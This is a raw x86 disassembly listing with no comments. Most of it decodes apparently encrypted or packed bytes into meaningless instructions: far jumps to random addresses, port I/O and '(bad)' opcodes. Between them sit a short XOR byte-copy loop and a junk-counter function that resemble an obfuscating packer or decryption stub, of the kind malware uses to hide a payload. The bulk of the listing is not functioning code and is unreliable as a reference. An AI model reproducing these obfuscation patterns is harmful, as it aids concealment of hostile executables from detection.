  403155:	mov    ch,BYTE PTR [ecx-0x35b2be34]
  40315b:	mov    BYTE PTR [ebx+ebp*4+0x75ea51ea],cl
  403162:	inc    edx
  403163:	mov    edx,0xfb8259f5
  403168:	xchg   cl,ah
  40316a:	push   ebp
  40316b:	lea    edx,[ebp-0x27]
  40316e:	or     BYTE PTR [ecx],ah
  403170:	cdq    
  403171:	sub    BYTE PTR [edx],al
  403173:	fs xor dh,dl
  403176:	mov    eax,ds:0x45bcadeb
  40317b:	arpl   WORD PTR [eax-0x1b],di
  40317e:	sbb    al,0xb6
  403180:	xchg   edx,eax
  403181:	loop   0x403127
  403183:	out    0xba,eax
  403185:	loope  0x4031c3
  403187:	ficomp WORD PTR [eiz*8+0x7c7ef43c]
  40318e:	push   ebx
  40318f:	mov    bh,0x19
  403191:	and    BYTE PTR [ebx-0x23],ch
  403194:	push   esp
  403195:	mov    al,0xca
  403197:	inc    ebx
  403198:	xchg   edx,eax
  403199:	cmp    esi,esi
  40319b:	jns    0x403150
  40319d:	test   DWORD PTR [edx+edi*4+0x41],esp
  4031a1:	aas    
  4031a2:	mov    ds:0x27267120,eax
  4031a7:	and    edx,DWORD PTR [ebx]
  4031a9:	mov    dl,0xb2
  4031ab:	push   edi
  4031ac:	pusha  
  4031ad:	int3   
  4031ae:	push   es
  4031af:	bnd jbe 0x4031c2
  4031b2:	out    0x4c,eax
  4031b4:	xor    BYTE PTR [ecx],bl
  4031b6:	ja     0x40313e
  4031b8:	jle    0x40319c
  4031ba:	push   0x7b963757
  4031bf:	pop    ebp
  4031c0:	test   BYTE PTR [ecx-0x50a982c4],dh
  4031c6:	fst    QWORD PTR [ecx]
  4031c8:	and    BYTE PTR [eax-0x57c845f5],0x1b
  4031cf:	dec    ecx
  4031d0:	outs   dx,DWORD PTR ds:[esi]
  4031d1:	or     DWORD PTR [ecx-0x2265697d],ecx
  4031d7:	inc    ebp
  4031d8:	xchg   BYTE PTR [ebx+0x674845a5],al
  4031de:	mov    al,0xb0
  4031e0:	add    al,0x64
  4031e2:	es dec ebx
  4031e4:	aas    
  4031e5:	mov    edx,0xa84690de
  4031ea:	addr16 test al,0xbd
  4031ed:	pop    ds
  4031ee:	or     eax,0x1760b6d
  4031f3:	and    BYTE PTR [esi+0x5f],0xf2
  4031f7:	sbb    DWORD PTR [edx],eax
  4031f9:	sbb    ebp,esi
  4031fb:	outs   dx,DWORD PTR ds:[esi]
  4031fc:	pop    esp
  4031fd:	shl    DWORD PTR [edi],cl
  4031ff:	push   edi
  403200:	mov    BYTE PTR [eax+0x1e33fad2],dl
  403206:	bound  esp,QWORD PTR [eax]
  403208:	jno    0x403195
  40320a:	push   es
  40320b:	ins    DWORD PTR es:[edi],dx
  40320c:	jp     0x40321e
  40320e:	mov    DWORD PTR [eax-0x7606c33e],eax
  403214:	mov    cl,0xf0
  403216:	dec    ebx
  403217:	rcr    BYTE PTR [ecx+0x77248f96],1
  40321d:	es dec ebp
  40321f:	(bad)  
  403220:	loop   0x403274
  403222:	xor    eax,0xcf5e159f
  403227:	and    al,0x39
  403229:	dec    ebp
  40322a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40322b:	xor    al,0xd4
  40322d:	scas   al,BYTE PTR es:[edi]
  40322e:	mov    edi,0xe5acfc8e
  403233:	out    dx,eax
  403234:	mov    ebx,0xdac940c6
  403239:	pop    edi
  40323a:	ret    
  40323b:	and    BYTE PTR [ecx-0x10f4d13d],dh
  403241:	adc    dl,BYTE PTR [edi-0x2218d848]
  403247:	xchg   DWORD PTR [eax+eax*4],edx
  40324a:	push   eax
  40324b:	popf   
  40324c:	push   es
  40324d:	dec    ecx
  40324e:	sahf   
  40324f:	pop    ebx
  403250:	enter  0x3822,0x64
  403254:	push   ds
  403255:	and    esi,eax
  403257:	xor    ebp,eax
  403259:	int3   
  40325a:	mov    al,ds:0xff5dc997
  40325f:	push   eax
  403260:	adc    DWORD PTR [ebp+0x64ab6bdf],esi
  403266:	daa    
  403267:	xchg   ebp,eax
  403268:	adc    al,0x60
  40326a:	sub    al,BYTE PTR [edx+0xb0ec2b9]
  403270:	inc    edi
  403271:	mov    bl,0xf8
  403273:	arpl   di,di
  403275:	and    ecx,DWORD PTR [ecx]
  403277:	sti    
  403278:	ins    BYTE PTR es:[edi],dx
  403279:	stos   BYTE PTR es:[edi],al
  40327a:	cwde   
  40327b:	mov    eax,ds:0x28d6d9bc
  403280:	aad    0x23
  403282:	jle    0x4032b3
  403284:	mov    ch,BYTE PTR [eax+eiz*8+0x26e7b881]
  40328b:	push   ecx
  40328c:	rcr    dl,1
  40328e:	idiv   BYTE PTR [edx+0x38]
  403291:	popa   
  403292:	popa   
  403293:	out    0xba,eax
  403295:	aas    
  403296:	push   0x383a72c2
  40329b:	icebp  
  40329c:	xor    DWORD PTR ds:0x1985b01a,ecx
  4032a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4032a3:	and    dl,dl
  4032a5:	sbb    DWORD PTR [ecx+0x3ca93590],ecx
  4032ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032ac:	clc    
  4032ad:	ss ds mov al,0xce
  4032b1:	iret   
  4032b2:	mov    eax,ds:0x1c0d847e
  4032b7:	faddp  st(7),st
  4032b9:	mov    ebx,0x846546d4
  4032be:	(bad)  
  4032bf:	sub    ecx,DWORD PTR [ebx]
  4032c1:	xor    DWORD PTR [eax],0xecd851c7
  4032c7:	add    DWORD PTR [edx],esp
  4032c9:	mov    dh,0x5
  4032cb:	ror    BYTE PTR [ebx*1-0x5289bec6],cl
  4032d2:	(bad)  
  4032d3:	std    
  4032d4:	mov    ch,0x3
  4032d6:	adc    edi,DWORD PTR cs:[ebx-0x35]
  4032da:	fist   WORD PTR [esi+0x5a]
  4032dd:	sub    ebx,DWORD PTR [ebx-0x18efdf00]
  4032e3:	lods   eax,DWORD PTR ds:[esi]
  4032e4:	cmp    al,dl
  4032e6:	cld    
  4032e7:	daa    
  4032e8:	mov    ds:0x5a410aef,al
  4032ed:	sbb    bl,bl
  4032ef:	loopne 0x403307
  4032f1:	pushf  
  4032f2:	xlat   BYTE PTR ds:[ebx]
  4032f3:	or     BYTE PTR [eax+0x1b1e3b0c],ah
  4032f9:	mov    DWORD PTR [ecx-0x4e],ebp
  4032fc:	(bad)  
  4032fe:	in     al,dx
  4032ff:	in     al,0x67
  403301:	adc    eax,0x3cba14fc
  403306:	dec    esp
  403307:	stos   DWORD PTR es:[edi],eax
  403308:	mov    dh,0xc9
  40330a:	cld    
  40330b:	mov    cs,WORD PTR [ecx+0x62]
  40330e:	stos   BYTE PTR es:[edi],al
  40330f:	sar    BYTE PTR [eax],0xad
  403312:	cmp    DWORD PTR [esi+0x4cd7063],0x7bc760e9
  40331c:	into   
  40331d:	xchg   edi,eax
  40331e:	into   
  40331f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403320:	xchg   esp,eax
  403321:	(bad)  
  403322:	push   esi
  403323:	pop    edi
  403324:	mov    dl,0xc9
  403326:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403328:	push   ebp
  403329:	test   eax,0x973d810c
  40332e:	adc    DWORD PTR [eax],esi
  403330:	cmp    ch,BYTE PTR [ecx]
  403332:	dec    eax
  403333:	imul   ebp,DWORD PTR [ebp-0x4b],0xc50ab64d
  40333a:	adc    DWORD PTR ds:0xb857215c,esp
  403340:	push   es
  403341:	clc    
  403342:	mov    bh,0x79
  403344:	jb     0x4032f1
  403346:	imul   ebp,esp,0x13fd4ce
  40334c:	add    edi,DWORD PTR [eax+0x4e4a0ca]
  403352:	push   eax
  403353:	and    eax,0x51127ca
  403358:	jnp    0x403302
  40335a:	lods   al,BYTE PTR ds:[esi]
  40335b:	cdq    
  40335c:	sbb    bh,al
  40335e:	fisttp QWORD PTR [esi+0x7f]
  403361:	sbb    esi,esp
  403363:	ins    BYTE PTR es:[edi],dx
  403364:	xchg   ebp,eax
  403365:	fbstp  TBYTE PTR [ebx]
  403367:	pop    ecx
  403368:	push   edi
  403369:	add    cl,cl
  40336b:	fstp   st(1)
  40336d:	(bad)  
  40336e:	pop    esp
  40336f:	or     eax,0x36130bea
  403374:	adc    eax,0xa596ec8b
  403379:	fcomp  DWORD PTR [esp+ecx*8]
  40337c:	add    DWORD PTR [edx-0x2b2a4f4c],edx
  403382:	lds    edx,FWORD PTR [ecx-0x549a6d06]
  403388:	mov    ebp,0xd337486d
  40338d:	in     al,0x24
  40338f:	aam    0xaa
  403391:	clc    
  403392:	pop    esi
  403393:	inc    ecx
  403394:	jnp    0x403378
  403396:	lds    esp,FWORD PTR [edx-0x749d4b88]
  40339c:	jne    0x4033a6
  40339e:	imul   edi,edx
  4033a1:	mov    ebx,DWORD PTR [ebp+0xc]
  4033a4:	xor    eax,ecx
  4033a6:	add    eax,edx
  4033a8:	jmp    0x403687
  4033ad:	jecxz  0x4033d3
  4033af:	fcom   DWORD PTR [edx]
  4033b1:	out    0xd2,eax
  4033b3:	icebp  
  4033b4:	icebp  
  4033b5:	pop    es
  4033b6:	xchg   edx,eax
  4033b7:	aaa    
  4033b8:	aas    
  4033b9:	lods   al,BYTE PTR ds:[esi]
  4033ba:	and    ecx,DWORD PTR [edi+0x6c]
  4033bd:	cmp    dl,BYTE PTR [eax+esi*2]
  4033c0:	jo     0x403380
  4033c2:	jle    0x403434
  4033c4:	jo     0x40341a
  4033c6:	push   ebp
  4033c7:	daa    
  4033c8:	push   edi
  4033c9:	pop    ss
  4033ca:	or     esp,DWORD PTR [ebp+eiz*2+0x7c]
  4033ce:	or     eax,0xfb140f35
  4033d3:	add    esp,DWORD PTR [edx]
  4033d5:	neg    DWORD PTR [eax]
  4033d7:	pop    ecx
  4033d8:	js     0x403379
  4033da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4033db:	(bad)  
  4033dc:	aam    0xce
  4033de:	jmp    0xc329b673
  4033e3:	inc    esp
  4033e4:	and    edi,DWORD PTR [eax+0x48730447]
  4033ea:	loope  0x403384
  4033ec:	jmp    0x5da7:0x2dac2826
  4033f3:	push   0xd3c421b4
  4033f8:	xchg   edx,eax
  4033f9:	ins    BYTE PTR es:[edi],dx
  4033fa:	xchg   ecx,eax
  4033fb:	daa    
  4033fc:	pusha  
  4033fd:	pusha  
  4033fe:	xchg   esi,edx
  403400:	jp     0x40342a
  403402:	test   DWORD PTR [ebx],ebp
  403404:	mov    DWORD PTR [ebx-0x4c],ebx
  403407:	(bad)  
  403408:	adc    eax,0x740886fd
  40340d:	and    esp,0x547f8cea
  403413:	sub    al,0xd7
  403415:	into   
  403416:	ds jnp 0x40345e
  403419:	xchg   esi,eax
  40341a:	in     al,0x95
  40341c:	adc    DWORD PTR [edx-0xb],ebp
  40341f:	adc    dl,al
  403421:	clc    
  403422:	inc    ecx
  403423:	loopne 0x403467
  403425:	cmp    ebx,ecx
  403427:	mov    esp,0x2b26019d
  40342c:	(bad)  
  40342d:	(bad)  
  40342f:	lds    edx,FWORD PTR [ecx+0x3bf9f004]
  403435:	mov    ebp,0xe09e8a3c
  40343a:	std    
  40343b:	and    ch,BYTE PTR ds:0xf2c2589e
  403441:	sub    al,0x89
  403443:	(bad)
  403446:	inc    edi
  403447:	sti    
  403448:	div    ebx
  40344a:	xchg   edx,eax
  40344b:	pop    ss
  40344c:	loop   0x4034cb
  40344e:	gs int 0xe8
  403451:	outs   dx,BYTE PTR ds:[esi]
  403452:	popf   
  403453:	mov    ch,0x63
  403455:	scas   al,BYTE PTR es:[edi]
  403456:	mov    eax,0xd3394495
  40345b:	fbld   TBYTE PTR [ebp-0x1702e962]
  403461:	mov    bh,0x4d
  403463:	xchg   ecx,eax
  403464:	cld    
  403465:	leave  
  403466:	fld    DWORD PTR [ecx+0x29256ded]
  40346c:	lock mov al,ds:0x282b6442
  403472:	(bad)  
  403474:	xchg   edi,eax
  403475:	pop    ecx
  403476:	frstor [edx]
  403478:	loope  0x4034a5
  40347a:	and    ch,BYTE PTR [esi-0x5d]
  40347d:	and    esp,DWORD PTR [edi-0x285004dd]
  403483:	mov    dh,0xe3
  403485:	xor    ch,0x7c
  403488:	add    ch,BYTE PTR [edi-0x33c52cc4]
  40348e:	jbe    0x4034b3
  403490:	int    0x3f
  403492:	iret   
  403493:	pop    ebx
  403494:	(bad)  
  403495:	mov    bh,0x9
  403497:	es xchg esi,eax
  403499:	aas    
  40349a:	fcomp  QWORD PTR [esi]
  40349c:	jmp    0xecff:0xdcb16c01
  4034a3:	adc    BYTE PTR [eax+0x7fcfcfb7],dh
  4034a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034aa:	xchg   edi,eax
  4034ab:	int    0x9f
  4034ad:	xchg   ebp,eax
  4034ae:	cwde   
  4034af:	jp     0x4034d6
  4034b1:	test   ah,cl
  4034b3:	or     DWORD PTR [ecx-0x108cabbd],edi
  4034b9:	or     ah,bh
  4034bb:	cmp    DWORD PTR [eax+0x8327113],edi
  4034c1:	dec    esp
  4034c2:	cmc    
  4034c3:	push   eax
  4034c4:	(bad)  
  4034c5:	(bad)  
  4034c6:	cmp    DWORD PTR [ebp+0x11],esi
  4034c9:	in     al,dx
  4034ca:	into   
  4034cb:	cmp    DWORD PTR [eax-0x3f15f337],eax
  4034d1:	or     al,0xdd
  4034d3:	and    BYTE PTR [edi-0x2e],dh
  4034d6:	scas   eax,DWORD PTR es:[edi]
  4034d7:	push   es
  4034d8:	aaa    
  4034d9:	add    ah,BYTE PTR ds:0x89925565
  4034df:	gs push ebp
  4034e1:	stos   BYTE PTR es:[edi],al
  4034e2:	inc    esi
  4034e3:	cmp    al,al
  4034e5:	pop    esp
  4034e6:	inc    ebp
  4034e7:	jmp    0x9c931d72
  4034ec:	xor    dh,BYTE PTR [eax+ebx*4+0x5a]
  4034f0:	and    DWORD PTR [eax],esi
  4034f2:	call   FWORD PTR [ebp-0x5b]
  4034f5:	fsub   QWORD PTR [ecx]
  4034f7:	or     cl,BYTE PTR [esi+0x3cd7be3e]
  4034fd:	imul   ebp,DWORD PTR [eax],0x50
  403500:	dec    ebp
  403501:	outs   dx,BYTE PTR ds:[esi]
  403502:	jl     0x403497
  403504:	ret    0x55f1
  403507:	dec    edx
  403508:	shl    DWORD PTR [edx+edx*2-0x6f910af8],cl
  40350f:	sbb    eax,0x94b26c82
  403514:	xchg   esi,eax
  403515:	mov    dh,0xa9
  403517:	push   0xd24a4499
  40351c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40351d:	sbb    al,0x35
  40351f:	ins    DWORD PTR es:[edi],dx
  403520:	out    dx,eax
  403521:	in     al,dx
  403522:	int    0xfc
  403524:	ret    0xfe65
  403527:	dec    edx
  403528:	pop    esp
  403529:	mov    bh,0x3a
  40352b:	data16 cmp dh,BYTE PTR [ebp+ebp*2-0x16eecca3]
  403533:	fild   QWORD PTR [edx-0x5f158a71]
  403539:	sub    eax,0xa20fb497
  40353e:	cmp    esi,0x72
  403541:	push   edi
  403542:	mov    cl,0x43
  403544:	add    DWORD PTR [eax],edx
  403546:	jmp    0x403541
  403548:	fadd   QWORD PTR [ebp-0x67]
  40354b:	pop    ebx
  40354c:	scas   al,BYTE PTR es:[edi]
  40354d:	ins    BYTE PTR es:[edi],dx
  40354e:	repz gs inc esp
  403551:	hlt    
  403552:	jmp    0xdf30:0xf6ff4dce
  403559:	sub    DWORD PTR [eax],0x9bcdabf3
  40355f:	scas   al,BYTE PTR es:[edi]
  403560:	xor    bl,BYTE PTR [ebp-0x5d5001e]
  403566:	rol    DWORD PTR es:0xa04712e0,0x20
  40356e:	sub    bh,BYTE PTR [esi+eiz*1-0x75cc47ad]
  403575:	jb     0x403582
  403577:	leave  
  403578:	sti    
  403579:	inc    edx
  40357a:	inc    ebp
  40357b:	imul   esp,DWORD PTR [ecx-0x423814f6],0x8144195a
  403585:	jns    0x403568
  403587:	adc    BYTE PTR [esp+eiz*8+0x59210a68],al
  40358e:	int3   
  40358f:	xor    BYTE PTR gs:[edx],ah
  403592:	shl    edx,cl
  403594:	ins    DWORD PTR es:[edi],dx
  403595:	add    al,0xd1
  403597:	cmp    esi,DWORD PTR [ecx]
  403599:	cmp    DWORD PTR [ecx+0x46],0xffffffe7
  40359d:	mov    ecx,0x7cc69c46
  4035a2:	inc    edx
  4035a3:	retf   0x4ae8
  4035a6:	pop    esi
  4035a7:	jno    0x403606
  4035a9:	xor    BYTE PTR [edi-0x47],bh
  4035ac:	sub    eax,0xe381b3a2
  4035b1:	outs   dx,DWORD PTR ds:[esi]
  4035b2:	sti    
  4035b3:	(bad)  
  4035b4:	adc    bh,BYTE PTR [edi+0x3f95796c]
  4035ba:	outs   dx,DWORD PTR ds:[esi]
  4035bb:	aas    
  4035bc:	and    bh,BYTE PTR [esi-0x20674acd]
  4035c2:	cdq    
  4035c3:	clc    
  4035c4:	push   ebp
  4035c5:	test   eax,0x48643336
  4035ca:	and    DWORD PTR [ebp+0x2a],eax
  4035cd:	sub    ah,BYTE PTR [ebx-0x6a]
  4035d0:	mov    edi,0xf55d8c83
  4035d5:	gs push ss
  4035d7:	in     al,dx
  4035d8:	pop    ecx
  4035d9:	mov    edx,0xb446a51b
  4035de:	push   ecx
  4035df:	jbe    0x4035ad
  4035e1:	jg     0x4035c3
  4035e3:	ror    DWORD PTR [edx+0x9],1
  4035e6:	mov    ebp,0xa7515b62
  4035eb:	inc    esp
  4035ec:	jns    0x4035c6
  4035ee:	outs   dx,DWORD PTR ds:[esi]
  4035ef:	loope  0x4035c6
  4035f1:	nop
  4035f2:	jo     0x403667
  4035f4:	cwde   
  4035f5:	sbb    DWORD PTR [ecx],ebp
  4035f7:	out    dx,al
  4035f8:	sbb    BYTE PTR [edi+0x3f],dl
  4035fb:	outs   dx,BYTE PTR ds:[esi]
  4035fc:	inc    ebp
  4035fd:	add    dh,BYTE PTR [ebx+0x2abfa901]
  403603:	lds    eax,FWORD PTR [ebx]
  403605:	xor    esp,DWORD PTR [eax]
  403607:	stos   DWORD PTR es:[edi],eax
  403608:	and    al,0x60
  40360a:	ret    
  40360b:	aad    0xe2
  40360d:	dec    DWORD PTR [edi+eax*1-0x5a]
  403611:	jns    0x4035e8
  403613:	out    0x9,eax
  403615:	add    edi,DWORD PTR ds:0x4863a622
  40361b:	cmp    dl,cl
  40361d:	push   ebp
  40361e:	mov    ecx,0xa71c6a0a
  403623:	pop    edi
  403624:	adc    BYTE PTR [ebp+0x7e51efb0],0xc5
  40362b:	retf   
  40362c:	stc    
  40362d:	shl    BYTE PTR [edi-0x36],1
  403630:	jno    0x403637
  403632:	sbb    al,0x68
  403634:	scas   al,BYTE PTR es:[edi]
  403635:	sbb    eax,0xdd0034c8
  40363a:	and    eax,DWORD PTR [eax+0x6acf5bab]
  403640:	or     edx,DWORD PTR [ebx-0x79372ec1]
  403646:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403647:	(bad)  [esi-0x6e]
  40364a:	scas   al,BYTE PTR es:[edi]
  40364b:	retf   
  40364c:	loop   0x4035e6
  40364e:	leave  
  40364f:	leave  
  403650:	clc    
  403651:	lea    ebp,[edx+0x5f]
  403654:	jns    0x403612
  403656:	mov    edx,0x92ab4299
  40365b:	scas   al,BYTE PTR es:[edi]
  40365c:	rcl    cl,0xa2
  40365f:	sub    eax,DWORD PTR [ebx+eax*4+0x6f]
  403663:	or     BYTE PTR [edi+esi*4-0x56],dl
  403667:	cmp    al,0x6e
  403669:	or     eax,0x2a58f237
  40366e:	mov    WORD PTR ds:0xbc9b48c2,fs
  403674:	arpl   WORD PTR [ebx+0x14],si
  403677:	sub    DWORD PTR [ecx],ebx
  403679:	nop
  40367a:	jmp    0x1919:0x11c6dd8e
  403681:	dec    edx
  403682:	push   0xffffffa7
  403684:	das    
  403685:	inc    edx
  403686:	fwait
  403687:	mov    al,BYTE PTR [ebx+eax*1+0x32729c]
  40368e:	mov    BYTE PTR [edi+esi*1],al
  403691:	mov    eax,DWORD PTR [ebp-0x4]
  403694:	xor    eax,ecx
  403696:	lea    edx,[edx+eax*1+0x32729c]
  40369d:	mov    eax,DWORD PTR [ebp-0x4]
  4036a0:	xor    eax,ecx
  4036a2:	mov    esi,0xffcd8d64
  4036a7:	sub    esi,eax
  4036a9:	add    esi,DWORD PTR [ebp+0x10]
  4036ac:	cmp    edx,esi
  4036ae:	jbe    0x4030ad
  4036b4:	pop    ebx
  4036b5:	mov    eax,0xf89c8530
  4036ba:	pop    edi
  4036bb:	pop    esi
  4036bc:	leave  
  4036bd:	ret    0xc
  4036c0:	push   ebp
  4036c1:	mov    ebp,esp
  4036c3:	sub    esp,0x58
  4036c6:	mov    DWORD PTR ds:0x42fced,0x17
  4036d0:	cmp    DWORD PTR ds:0x42fced,0x0
  4036d7:	je     0x40372c
  4036dd:	cmp    DWORD PTR ds:0x42fced,0x7
  4036e4:	jne    0x4036fc
  4036ea:	push   0x0
  4036ec:	push   0x25f8
  4036f1:	push   0x8523
  4036f6:	call   DWORD PTR ds:0x42e2d7
  4036fc:	cmp    DWORD PTR ds:0x42fced,0x8
  403703:	jne    0x403717
  403709:	xor    eax,eax
  40370b:	or     eax,DWORD PTR ds:0x42fced
  403711:	dec    eax
  403712:	mov    ds:0x42fced,eax
  403717:	mov    eax,ds:0x42fced
  40371c:	dec    eax
  40371d:	mov    ds:0x42fced,eax
  403722:	jmp    0x4036d0
  403727:	adc    eax,0xdf
  40372c:	mov    ecx,DWORD PTR [ebp+0x8]
  40372f:	add    DWORD PTR ds:0x42e6f3,0x693e
  403739:	mov    eax,0x8a3e
  40373e:	adc    DWORD PTR ds:0x42e6f7,0x5ea2
  403748:	xor    ax,WORD PTR [ecx+0x20]
  40374c:	adc    DWORD PTR ds:0x42fd0d,ecx
  403752:	mov    ecx,0x3b04
  403757:	and    DWORD PTR ds:0x42e713,0x42e11c
  403761:	add    ax,cx
  403764:	mov    DWORD PTR ds:0x42fd7a,0x1b71
  40376e:	movzx  eax,ax
  403771:	mov    DWORD PTR [ebp-0xc],eax
  403774:	or     DWORD PTR ds:0x42e124,0x7677
  40377e:	mov    BYTE PTR [ebp-0x1],0x7f
  403782:	not    ecx
  403784:	lea    eax,[ebp-0x1]
  403787:	mov    DWORD PTR [ebp-0x10],eax
  40378a:	or     DWORD PTR ds:0x42e70f,ecx
  403790:	jmp    0x403af0
  403795:	out    0x52,eax
  403797:	out    0x78,al
  403799:	jno    0x40374f
  40379b:	in     eax,0x71
  40379d:	or     BYTE PTR [edx+0x68],bl
  4037a0:	and    eax,eax
  4037a2:	or     DWORD PTR [esi-0x66],esi
  4037a5:	js     0x4037b8
  4037a7:	jo     0x403819
  4037a9:	cmp    eax,0x4a70707d
  4037ae:	mov    ebx,0x7cedb6e8
  4037b3:	arpl   WORD PTR [ebp+0x2b480df],cx
  4037b9:	dec    eax
  4037ba:	lock jo 0x40382a
  4037bd:	xchg   BYTE PTR [esi+0x5d99a53a],ch
  4037c3:	xchg   BYTE PTR [esi-0x2c],bl
  4037c6:	xchg   ebp,eax
  4037c7:	jmp    0x6c5df5a
  4037cc:	sar    BYTE PTR [eax+0x4e],cl
  4037cf:	sub    eax,0xd6ff535d
  4037d4:	pop    ebx
  4037d5:	pushf  
  4037d6:	jae    0x403848
  4037d8:	sub    BYTE PTR [edi],0xcd
  4037db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037dc:	cmp    bh,al
  4037de:	mov    cl,0xc9
  4037e0:	push   ss
  4037e1:	push   esi
  4037e2:	mov    al,0xa8
  4037e4:	aam    0x4
  4037e6:	jmp    0xdf3a:0x720f6676
  4037ed:	pop    eax
  4037ee:	loope  0x403855
  4037f0:	test   al,0x27
  4037f2:	div    DWORD PTR [esi+edi*8-0x20]
  4037f6:	pop    ss
  4037f7:	push   0x45
  4037f9:	pop    ebp
  4037fa:	and    eax,0x63dc50
  4037ff:	inc    ebx
  403800:	dec    edx
  403801:	mov    ds:0x6bcfb0f7,eax
  403806:	jne    0x4037e1
  403808:	xchg   edx,eax
  403809:	push   es
  40380a:	fstp   TBYTE PTR [eax+0x4755d91f]
  403810:	rcr    DWORD PTR [ebx+ecx*8-0x5c51dec7],1
  403817:	xchg   DWORD PTR [edi+0x55],ebx
  40381a:	loopne 0x403810
  40381c:	pop    DWORD PTR [eax+0x39]
  40381f:	dec    ebp
  403820:	inc    edx
  403821:	pop    edx
  403822:	sub    BYTE PTR [eax+0x7606c0d8],dh
  403828:	outs   dx,BYTE PTR ds:[esi]
  403829:	pop    ss
  40382a:	cmp    eax,0x1f671707
  40382f:	(bad)  
  403830:	hlt    
  403831:	(bad)  
  403832:	pop    edx
  403833:	mov    edi,0xd8921b7a
  403838:	out    0x49,eax
  40383a:	aas    
  40383b:	ins    BYTE PTR es:[edi],dx
  40383c:	sbb    ecx,0xffffffe0
  40383f:	inc    edx
  403840:	and    ch,BYTE PTR ds:0x16a7d18b
  403846:	cdq    
  403847:	pop    ebp
  403848:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403849:	or     esp,esp
  40384b:	adc    DWORD PTR [edi-0x2],esi
  40384e:	in     eax,dx
  40384f:	xchg   esi,eax
  403850:	push   edx
  403851:	mov    esp,DWORD PTR [ecx]
  403853:	or     BYTE PTR [edx+0x2c],cl
  403856:	push   ss
  403857:	inc    bp
  403859:	fsubr  DWORD PTR [ecx+0x79a70af6]
  40385f:	mov    eax,0xb565612d
  403864:	push   edi
  403865:	in     eax,dx
  403866:	mov    edx,DWORD PTR [edi]
  403868:	mov    bh,BYTE PTR [ebx+0x10]
  40386b:	stos   DWORD PTR es:[edi],eax
  40386c:	xchg   ebx,eax
  40386d:	push   esp
  40386e:	sbb    eax,DWORD PTR [ecx]
  403870:	mov    ds:0xe92e770a,eax
  403875:	fldenv [esi-0x6708d5cd]
  40387b:	call   0x9a573e5a
  403880:	(bad)  
  403881:	iret   
  403882:	mov    edi,0xc881eaf0
  403887:	add    bl,bh
  403889:	inc    edi
  40388a:	push   cs
  40388b:	jne    0x40385a
  40388d:	es das 
  40388f:	ja     0x40384f
  403891:	sub    DWORD PTR [esi],edx
  403893:	mov    WORD PTR [esi-0x73],gs
  403896:	pushf  
  403897:	cmp    BYTE PTR [ecx+0x57],bh
  40389a:	push   eax
  40389b:	pop    esp
  40389c:	fldcw  WORD PTR [eax+ebp*4-0x12e55c0c]
  4038a3:	jae    0x40383a
  4038a5:	add    bl,cl
  4038a7:	dec    esi
  4038a8:	xor    eax,0xf14472ae
  4038ad:	ds in  al,0x6e
  4038b0:	inc    ecx
  4038b1:	fisubr DWORD PTR [ecx+ebp*2]
  4038b4:	push   cs
  4038b5:	cs jb  0x40392d
  4038b8:	mov    ds:0x6c840e5f,al
  4038bd:	sbb    DWORD PTR [esp+esi*4-0x5d],0x5d
  4038c2:	sbb    ebx,DWORD PTR [ebx-0x3b4f0094]
  4038c8:	cli    
  4038c9:	stos   BYTE PTR es:[edi],al
  4038ca:	test   DWORD PTR [ebp+edx*1+0x1bb0f6dd],0xdee604d1
  4038d5:	xor    bh,dh
  4038d7:	out    0xe,eax
  4038d9:	btc    esi,edx
  4038dc:	add    ebp,0x859284d9
  4038e2:	test   eax,0x5bf4cd6f
  4038e7:	cmp    al,0xec
  4038e9:	mov    al,0xa8
  4038eb:	or     dl,cl
  4038ed:	or     DWORD PTR ds:0x946c5a3e,0xb33fcd93
  4038f7:	sbb    al,0xf3
  4038f9:	rcl    cl,0x83
  4038fc:	jl     0x403917
  4038fe:	dec    esp
  4038ff:	push   ss
  403900:	cmp    esp,DWORD PTR [eax-0x337a2e48]
  403906:	inc    eax
  403907:	aad    0xbc
  403909:	dec    ebx
  40390a:	pop    ss
  40390b:	shl    ch,1
  40390d:	push   0xffffffb8
  40390f:	or     al,0x50
  403911:	dec    ebp
  403912:	and    DWORD PTR [edi],0x45256d79
  403918:	add    bh,BYTE PTR [edx+eax*2]
  40391b:	push   ss
  40391c:	ret    
  40391d:	or     ebx,esp
  40391f:	inc    ebp
  403920:	inc    esp
  403921:	mov    bl,0x2f
  403923:	push   0xffffffc9
  403925:	ret    0x860
  403928:	sbb    dl,BYTE PTR [edi]
  40392a:	fidivr DWORD PTR [ebx-0x4a]
  40392d:	jp     0x403960
  40392f:	es jo  0x40395b
  403932:	and    BYTE PTR [edx],dh
  403934:	xchg   esi,eax
  403935:	data16 xlat BYTE PTR ds:[ebx]
  403937:	(bad)
  40393a:	cmp    edx,DWORD PTR [edx-0x47]
  40393d:	xchg   edi,eax
  40393e:	retf   0x94a7
  403941:	fild   WORD PTR [ebp+ebp*1-0x259d3188]
  403948:	popa   
  403949:	or     edi,DWORD PTR ds:0x25b15963
  40394f:	xor    dl,BYTE PTR [ebp+0x11]
  403952:	sbb    eax,0xe5fe2554
  403957:	jns    0x403948
  403959:	aad    0x44
  40395b:	push   0xffffffed
  40395d:	mov    bh,0x1f
  40395f:	sahf   
  403960:	jp     0x4039a6
  403962:	mov    fs,eax
  403964:	into   
  403965:	dec    ebp
  403966:	jae    0x403978
  403968:	sub    eax,0xd0f4ae15
  40396d:	out    0x94,al
  40396f:	mov    dl,0x2e
  403971:	loopne 0x4039c0
  403973:	aaa    
  403974:	call   0xc9410e09
  403979:	cwde   
  40397a:	mov    ds:0x1f3c6087,al
  40397f:	cwde   
  403980:	fs stc 
  403982:	ins    DWORD PTR es:[edi],dx
  403983:	popf   
  403984:	retf   0x77ec
  403987:	repnz dec eax
  403989:	mov    ah,0x76
  40398b:	dec    edx
  40398c:	cmp    esp,esp
  40398e:	shl    DWORD PTR [bp-0x2d],1
  403992:	test   DWORD PTR [ecx],0x42ac8f43
  403998:	push   esi
  403999:	mov    db2,edi
  40399c:	iret   
